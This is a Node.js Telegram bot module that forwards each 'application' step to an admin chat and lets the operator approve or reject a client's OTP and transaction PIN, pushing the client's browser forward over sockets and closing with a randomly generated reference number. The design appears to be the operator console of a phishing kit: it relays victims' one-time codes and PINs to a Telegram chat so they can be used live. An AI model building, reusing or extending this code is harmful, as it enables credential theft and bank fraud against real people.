const TelegramBot = require('node-telegram-bot-api');
const token = process.env.BOT_TOKEN;
const adminChatId = process.env.ADMIN_CHAT_ID;

// Initialize bot with webhook capabilities
const bot = new TelegramBot(token);

/**
 * Format string layout helper for object payloads
 */
function formatPayload(data) {
    return Object.entries(data)
        .map(([key, val]) => `<b>${key}:</b> <code>${val}</code>`)
        .join('\n');
}

/**
 * Sends step information down to the admin chat with optional inline actions
 */
function sendToAdmin(appId, stepTitle, data, requireAction = false, actionType = '') {
    let message = `━━━━━━━━━━━━━━━━━━━━\n`;
    message += `🛑 <b>[${appId}] - ${stepTitle}</b>\n`;
    message += `━━━━━━━━━━━━━━━━━━━━\n`;
    message += formatPayload(data);
    message += `\n━━━━━━━━━━━━━━━━━━━━`;

    let options = { parse_mode: 'HTML' };

    if (requireAction) {
        options.reply_markup = {
            inline_keyboard: [
                [
                    { text: '✅ Approve', callback_data: `${actionType}_approve:${appId}` },
                    { text: '❌ Reject', callback_data: `${actionType}_reject:${appId}` }
                ]
            ]
        };
    }

    bot.sendMessage(adminChatId, message, options)
        .catch(err => console.error(`❌ Telegram send error:`, err.message));
}

// Handle Admin Callback Button Presses
bot.on('callback_query', (query) => {
    const { data, id } = query;
    const [action, appId] = data.split(':');

    // Answer callback immediately to stop telegram loading wheel
    bot.answerCallbackQuery(id);

    const globalIo = global.io;
    if (!globalIo) {
        bot.sendMessage(adminChatId, `⚠️ Error: Socket pipeline instance not linked.`);
        return;
    }

    if (action === 'otp_approve') {
        // Step 4 Approved -> Tells frontend to move onto Step 5 (PIN)
        globalIo.to(appId).emit('otp-verified');
        bot.sendMessage(adminChatId, `🟢 <b>[${appId}]</b> OTP Approved! Moving client to Step 5 (PIN).`, { parse_mode: 'HTML' });
    } 
    else if (action === 'otp_reject') {
        globalIo.to(appId).emit('otp-failed', { message: 'Invalid OTP code entered.' });
        bot.sendMessage(adminChatId, `🔴 <b>[${appId}]</b> OTP Rejected by Admin.`, { parse_mode: 'HTML' });
    } 
    else if (action === 'pin_approve') {
        // Step 5 Approved -> Generates unique reference code and closes loop
        const referenceId = `COD-${Math.floor(100000 + Math.random() * 900000)}`;
        globalIo.to(appId).emit('pin-verified', { referenceId: referenceId });
        bot.sendMessage(adminChatId, `🟢 <b>[${appId}]</b> PIN Approved! Application Closed. Ref: ${referenceId}`, { parse_mode: 'HTML' });
    } 
    else if (action === 'pin_reject') {
        globalIo.to(appId).emit('pin-failed', { message: 'Transaction PIN rejected.' });
        bot.sendMessage(adminChatId, `🔴 <b>[${appId}]</b> PIN Rejected by Admin.`, { parse_mode: 'HTML' });
    }
});

module.exports = {
    bot,
    sendToAdmin
};